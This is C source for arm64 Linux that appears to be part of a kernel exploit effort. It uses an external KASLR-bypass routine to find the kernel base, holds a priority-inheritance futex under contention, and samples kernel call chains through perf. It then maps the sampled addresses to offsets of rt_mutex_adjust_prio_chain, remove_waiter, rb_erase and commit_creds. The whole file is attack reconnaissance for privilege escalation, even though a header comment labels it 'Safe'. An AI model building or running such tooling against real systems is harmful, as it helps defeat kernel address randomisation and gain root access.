/* futex_pi_perf3.c — minimal: owner thread holds PI lock; main waits on it
 * (contended). perf on main thread (pid 0) samples its kernel path. Safe. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <pthread.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"
#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif
#define RP 16
#define MAXO 600000
static uint64_t offs[MAXO]; static int no;
static volatile int fut=0, stop=0;
static inline long xf(void*u,int op){ long r=syscall(98,u,op,0,0,0,0); return r; }
#define FLPI (6|128)
#define FUPI (7|128)

static void* holder(void*x){ (void)x;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    xf(&fut,FLPI);
    while(!stop){ usleep(3000); xf(&fut,FUPI); usleep(3000); xf(&fut,FLPI); }
    xf(&fut,FUPI);
    return 0;
}
static void drain(void*base,size_t pg,size_t ds,struct perf_event_mmap_page*meta,uint64_t kt){
    char*d=(char*)base+pg; __sync_synchronize();
    uint64_t head=meta->data_head;
    while(meta->data_tail<head){
        struct perf_event_header*h=(void*)(d+(meta->data_tail%ds));
        if(h->size<sizeof(*h)){meta->data_tail=head;break;}
        if(h->type==PERF_RECORD_SAMPLE){
            char*q=(char*)h+sizeof(*h);
            uint64_t ip; memcpy(&ip,q,8); q+=8;
            uint64_t nr; memcpy(&nr,q,8); q+=8;
            if(ip>=0xffff000000000000UL&&no<MAXO) offs[no++]=ip-kt;
            if(nr>64)nr=64;
            for(uint64_t k=0;k<nr;k++){uint64_t c;memcpy(&c,q,8);q+=8;
                if(c>=0xffff000000000000UL&&no<MAXO) offs[no++]=c-kt;}
        }
        meta->data_tail+=h->size;
    }
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    uint64_t kt=kaaslr_text_base(); for(int r=0;r<6&&!kt;r++) kt=kaaslr_text_base();
    printf("[*] _text_runtime=%#018llx\n",(unsigned long long)kt);
    if(!kt) return 1;
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs); }
    struct perf_event_attr a; memset(&a,0,sizeof(a));
    a.type=PERF_TYPE_HARDWARE; a.size=sizeof(a); a.config=PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_CALLCHAIN; a.sample_period=1500;
    a.disabled=1; a.exclude_kernel=0; a.exclude_hv=1; a.wakeup_events=1;
    int fd=(int)syscall(__NR_perf_event_open,&a,0,-1,-1,0);
    if(fd<0){ printf("[!] perf errno=%d\n",errno); return 1; }
    size_t pg=sysconf(_SC_PAGESIZE), ds=RP*pg, ms=ds+pg;
    void*base=mmap(NULL,ms,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(base==MAP_FAILED){ printf("[!] mmap %d\n",errno); return 1; }
    struct perf_event_mmap_page*meta=base;
    pthread_t h; pthread_create(&h,0,holder,0);
    usleep(50000);
    ioctl(fd,PERF_EVENT_IOC_RESET,0); ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(int i=0;i<250 && no<MAXO;i++){
        xf(&fut,FLPI);   /* blocks on holder -> PI chain walk */
        xf(&fut,FUPI);
        drain(base,pg,ds,meta,kt);
        usleep(2000);
    }
    drain(base,pg,ds,meta,kt);
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
    stop=1; pthread_join(h,0);
    munmap(base,ms); close(fd);
    printf("[*] offsets=%d\n",no);
    struct{long lo,hi;const char*nm;}R[]={
        {10425660,10425952,"rb_insert_color"},
        {10426028,10426800,"rb_erase"},
        {21986572,21987828,"remove_waiter"},
        {21987828,21992448,"rt_mutex_adjust_prio_chain"},
        {2584632,2592552,"do_futex"},
        {2599164,2602332,"futex_lock_pi"},
        {1540052,1541276,"commit_creds"},
        {0x11470,0x11780,"el0t_64_sync"},
    };
    for(unsigned r=0;r<sizeof(R)/sizeof(R[0]);r++){
        int c=0;uint64_t mn=~0ull,mx=0;
        for(int i=0;i<no;i++)if((long)offs[i]>=R[r].lo&&(long)offs[i]<R[r].hi){c++;if(offs[i]<mn)mn=offs[i];if(offs[i]>mx)mx=offs[i];}
        printf("HIT %-28s count=%-7d",R[r].nm,c);
        if(c)printf(" [%#lx..%#lx]",(unsigned long)mn,(unsigned long)mx);
        printf("\n");
    }
    /* top offsets 0x270000..0x2a0000 and 0x9f0000..0xa00000 and 0x14f0000..0x1500000 regions */
    struct{long lo,hi;const char*t;}Z[]={{0x260000,0x2b0000,"futex(.170 0x27xxxx)"},{0x9e0000,0xa10000,"rb(.170 0x9fxxxx)"},{0x14f0000,0x1510000,"rtmutex(.170 0x14fxxxx)"}};
    for(unsigned z=0;z<3;z++){
        static uint64_t v[40000]; static int cc[40000]; int n=0;
        uint64_t*so=malloc(sizeof(uint64_t)*(no?no:1)); memcpy(so,offs,sizeof(uint64_t)*no);
        /* insertion-free: just linear unique count for region */
        for(int i=0;i<no;i++){ if((long)so[i]>=Z[z].lo&&(long)so[i]<Z[z].hi){ int f=-1; for(int k=0;k<n;k++) if(v[k]==so[i]){f=k;break;} if(f<0&&n<40000){v[n]=so[i];cc[n]=1;n++;} else if(f>=0) cc[f]++; } }
        free(so);
        printf("=== %s: %d distinct ===\n",Z[z].t,n);
        for(int t=0;t<8&&n>0;t++){int bi=-1;for(int k=0;k<n;k++)if(cc[k]>0&&(bi<0||cc[k]>cc[bi]))bi=k;if(bi<0)break;
            printf("  %#08lx x%d\n",(unsigned long)v[bi],cc[bi]);cc[bi]=0;}
    }
    return 0;
}
